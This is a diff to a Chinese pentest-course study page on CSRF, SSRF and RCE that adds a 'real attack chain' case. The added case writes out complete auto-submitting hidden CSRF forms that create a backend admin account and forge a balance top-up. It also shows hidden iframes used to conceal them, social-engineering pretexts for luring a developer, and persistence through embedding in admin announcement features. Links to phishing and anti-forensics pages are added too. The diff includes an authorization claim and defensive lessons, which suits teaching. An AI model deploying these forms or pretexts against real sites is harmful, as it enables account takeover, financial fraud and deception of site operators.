@@ -1,8 +1,8 @@
 ---
-title: XD安全渗透测试课程 Day 29-30 学习笔记：CSRF、SSRF 与 RCE 漏洞原理实战
+title: XD安全渗透测试课程 Day 29-30 学习笔记：CSRF、SSRF 与 RCE 漏洞原理实战（补充真实攻击链案例）
 description: 系统整理 XD安全渗透测试课程第 29-30 天学习内容：CSRF 跨站请求伪造原理与 Pikachu 靶场 GET/POST 型实战、SSRF
   服务端请求伪造漏洞挖掘点、内网端口探测与 file 协议利用、RCE 远程命令/代码执行成因及 Webmin CVE-2019-15107、Struts2、HFS
-  经典案例复现。
+  经典案例复现。新增真实案例：通过社工诱导开发者嵌入恶意页面，结合 iframe 隐藏 CSRF 表单自动提交，实现后台添加管理员账号与充值功能的持久化攻击链。
 category: program-analysis
 tags:
 - XD安全
@@ -16,6 +16,8 @@ tags:
 - HFS
 - CVE-2019-15107
 - 学习笔记
+- 社工攻击
+- 攻击链复现
 date: 2024-01-15
 updated: '2026-11-15'
 ---
@@ -25,6 +27,8 @@ updated: '2026-11-15'
 
 - **Day 29**：CSRF 跨站请求伪造原理与 Pikachu 靶场 GET/POST 型实战演示；SSRF 服务端请求伪造漏洞挖掘点、内网端口探测、file 协议读取敏感文件实战。
 - **Day 30**：RCE 远程命令/代码执行漏洞成因分析，Pikachu 靶场 Ping 命令注入实战，Webmin CVE-2019-15107 密码重置处命令注入复现，Struts2 与 HFS 经典 RCE 案例简述。
+
+**本版本新增**：基于归档文章《一个猥琐的持续性攻击思路》的真实攻击链复现——通过社工诱导开发者嵌入恶意页面，结合 iframe 隐藏 CSRF 表单自动提交，实现后台添加管理员账号与充值功能的持久化攻击链。
 
 页面在保留原文实战细节的基础上，按漏洞类型模块化组织，并交叉引用知识库中已有的 Pikachu 靶场系列、SSRF 利用指南、XD安全课程相关页面，形成可检索、可延伸的结构化知识页。
 
@@ -201,6 +205,123 @@ user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2
 
 ---
 
+## 实战案例：社工诱导开发者嵌入恶意页面的 CSRF 持久化攻击链
+
+> **来源**：归档文章《一个猥琐的持续性攻击思路》  
+> **授权说明**：相关站点运维已授权，测试后已删除恶意代码并关闭站点。
+
+### 攻击背景
+- **目标**：某陪玩平台后台管理系统（非官方模板，个人开发）
+- **前置发现**：后台存在 CSRF 漏洞（无 Token/Session 验证），可直接添加管理员账号
+- **难点**：需管理员触发恶意页面，且开发者不直接访问攻击者控制的页面
+
+### 攻击链完整复现
+
+#### 第一阶段：漏洞挖掘与 CSRF POC 构造
+1. **越权测试发现**：修改密码、充值等接口数据包中无用户标识，仅含新旧密码/金额参数
+2. **CSRF 验证**：构造 POC 直接添加管理员账号成功
+3. **功能点确认**：
+   - 添加管理员：`/Qwadmin/Peiwanmember/update.html` (POST)
+   - 充值功能：`/Qwadmin/Peiwanmember/chongzhi.html` (POST)
+
+#### 第二阶段：社工准备与恶意页面制作
+1. **目标锁定**：通过聊天套近乎，确认开发者维护多个工会网站，具备后台权限
+2. **心理战术**：
+   - 伪装成需求方，声称购买源码/数据
+   - 以「测试演示」为由要求开发者访问指定页面
+3. **恶意页面设计**（两个隐藏 CSRF 表单）：
+
+**tianjia.html - 添加管理员账号**
+```html
+<html>
+<body>
+  <form action="http://XXX.xxxxxx.com/Qwadmin/Peiwanmember/update.html" method="POST" name="myfrom">
+    <input type="hidden" name="head" value="" />
+    <input type="hidden" name="user" value="ooo" />
+    <input type="hidden" name="bid" value="5" />
+    <input type="hidden" name="group_id" value="1" />
+    <input type="hidden" name="password" value="123123" />
+    <input type="hidden" name="sex" value="0" />
+    <input type="hidden" name="fenlei_15" value="" />
+    <input type="hidden" name="fenlei_16" value="" />
+    <input type="hidden" name="fenlei_17" value="" />
+    <input type="hidden" name="phone" value="" />
+    <input type="hidden" name="qq" value="" />
+    <input type="hidden" name="yyid" value="" />
+    <input type="hidden" name="email" value="" />
+    <input type="hidden" name="zhifubao" value="" />
+    <input type="hidden" name="zhekou" value="100" />
+    <input type="hidden" name="tichengbili" value="70" />
+    <input type="hidden" name="info" value="" />
+    <script>
+      function sub(){ document.myfrom.submit(); }
+      setTimeout(sub, 100);  // 页面加载 0.1 秒后自动提交
+    </script>
+  </form>
+</body>
+</html>
+```
+
+**chongzhiyy.html - 自动充值**
+```html
+<html>
+<body>
+  <form action="http://XXX.xxxxxx.com/Qwadmin/Peiwanmember/chongzhi.html" method="POST" name="myfrom">
+    <input type="hidden" name="aids" value="6018" />
+    <input type="hidden" name="numchong" value="300" />
+    <input type="hidden" name="numchongtype" value="5" />
+    <input type="hidden" name="numzeng" value="" />
+    <input type="hidden" name="oid" value="" />
+    <input type="hidden" name="cinfo" value="20170507200040011220210053559226+300+伪造订单号" />
+    <input type="hidden" name="numchongisshow" value="0" />
+    <input type="hidden" name="numchongshowinfo" value="充值成功" />
+    <script>
+      function sub(){ document.myfrom.submit(); }
+      setTimeout(sub, 100);
+    </script>
+  </form>
+</body>
+</html>
+```
+
+#### 第三阶段：iframe 隐藏与持久化投递
+1. **问题**：表单提交会导致页面跳转，暴露异常
+2. **解决**：构造主页面 `index.html`，通过 iframe 嵌入两个 POC 页面
+```html
+<iframe src="tianjia.html" style="display:none;"></iframe>
+<iframe src="chongzhiyy.html" style="display:none;"></iframe>
+```
+- `display:none` 隐藏 iframe，用户无感知
+- 表单提交仅在 iframe 内跳转，不影响主页面展示
+3. **投递方式**：社工诱导开发者在后台「公告/广告/自定义页面」功能中嵌入该恶意页面链接或直接写入 iframe 代码
+
+#### 第四阶段：攻击触发与清理
+1. **等待触发**：管理员登录后台访问含恶意 iframe 的页面 → 自动添加管理员账号 + 充值
+2. **验证成功**：攻击者使用新账号登录后台，确认权限获取
+3. **痕迹清理**：攻击触发前主动删除恶意代码、关闭测试站点、协调处理事件
+
+### 攻击链关键技术点总结
+
+| 环节 | 技术点 | 关键细节 |
+|------|--------|----------|
+| 漏洞利用 | CSRF 无防护 | 无 Token、Referer 校验，关键操作仅靠 Cookie 认证 |
+| 武器化 | POST 型 CSRF 自动提交 | `setTimeout(sub, 100)` 实现无交互自动提交 |
+| 隐蔽性 | iframe 隔离跳转 | `display:none` 隐藏 iframe，表单提交不污染主页面 |
+| 社工诱导 | 角色扮演 + 信任建立 | 伪装买家，通过「测试演示」合理化访问请求 |
+| 持久化 | 后台功能植入 | 利用公告/广告等合法功能长期托管恶意代码 |
+| 痕迹管理 | 主动清理与协调 | 攻击前清理、事后沟通，体现授权测试规范 |
+
+### 防御启示
+1. **全站 CSRF 防护**：所有状态修改接口强制校验随机 Token / SameSite Cookie
+2. **后台内容安全策略**：限制公告/广告等功能的 HTML 输入，禁止 iframe、script 标签
+3. **管理员操作审计**：关键操作（添加管理员、充值）记录操作人、来源 IP、Referer
+4. **社工意识培训**：开发/运维人员需警惕「测试演示」「源码交易」等社工话术
+5. **最小权限原则**：后台账号分级，日常运营账号无添加管理员权限
+
+> 该案例展示了 **「漏洞利用 + 武器化投递 + 社工绕过 + 持久化控制」** 的完整攻击链，是 CSRF 从「理论可利用」转化为「实战高危」的典型范例。
+
+---
+
 ## 交叉引用与延伸阅读
 
 | 专题 | 页面 | 说明 |
@@ -218,6 +339,8 @@ user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2
 | PHP Webshell 基础与蚁剑/菜刀流量分析 | [[php-webshell-fundamentals-chopper-analysis]] | 一句话木马原理、Content-Type 绕过、攻防世界实战 |
 | Shellshock CVE-2014-6271 CGI 利用链 | [[0w1club-training-shellshock-cgi-exploitation]] | User-Agent 注入反弹 Shell、Dirty COW 提权全链路 |
 | VulnHub DOUBLETROUBLE 靶机复现 | [[vulnhub-doubletrouble-writeup]] | Shellshock + Dirty COW 完整攻击链 |
+| 社工钓鱼网站制作入门 | [[phishing-website-creation-tutorial]] | SET工具、PHP表单劫持、Docker部署靶场 |
+| 红队 OPSEC 实战守则 | [[redteam-hw-opsec-guidelines]] | 环境隔离、工具指纹清洗、C2隐匿、日志反取证 |
 
 ---
 
@@ -227,11 +350,12 @@ user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2
 - SSRF 漏洞深度文章：`https://www.t00ls.net/articles-41070.html`
 - Java Web 代码审计入门：`https://www.cnblogs.com/ermei/p/6689005.html`
 - CVE-2019-11043 PHP-FPM 研究：`http://blog.leanote.com/post/snowming/9da184ef24bd`
+- 真实攻击链案例来源：《一个猥琐的持续性攻击思路》（微信公众号归档文章）
 
 ---
 
-> 本页面为知识库结构化沉淀，后续可在实战复现、工具自动化、变种挖掘等方向持续扩展。建议配合上述交叉引用页面形成完整攻防知识体系。
+> 本页面为知识库结构化沉淀，后续可在实战复现、工具自动化、变种挖掘等方向持续扩展。建议配合上述交叉引用页面形成完整攻防知识体系。真实案例部分展示了 CSRF 漏洞在社工配合下的高危转化路径，为蓝队防御提供了「技术防护 + 管理规范 + 人员意识」三维度的参考。
 
 ## 来源
 
-- [0x00实验室-202108-202304_101](../sources/0x00实验室-202108-202304_101.md)
+- [226安全团队-201805-202103_44](../sources/226安全团队-201805-202103_44.md)
